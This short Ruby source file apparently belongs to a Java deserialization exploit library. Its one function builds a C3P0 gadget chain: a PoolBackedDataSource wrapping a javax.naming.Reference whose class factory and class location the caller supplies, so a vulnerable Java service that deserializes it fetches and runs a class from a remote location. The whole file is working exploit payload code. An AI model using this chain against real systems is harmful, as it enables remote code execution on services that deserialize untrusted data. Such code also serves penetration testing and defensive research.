
require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module C3P0
        def make_classload(classpath, cls)
          JavaObject.new('Lcom/mchange/v2/c3p0/PoolBackedDataSource;', 'connectionPoolDataSource' =>
                             JavaObject.new('Lcom/mchange/v2/naming/ReferenceIndirector$ReferenceSerialized;',
                                            'reference' => JavaObject.new('Ljavax/naming/Reference;',
                                                                          'classFactory' => cls,
                                                                          'classFactoryLocation' => classpath)))
        end
        module_function :make_classload
      end
    end
  end
end
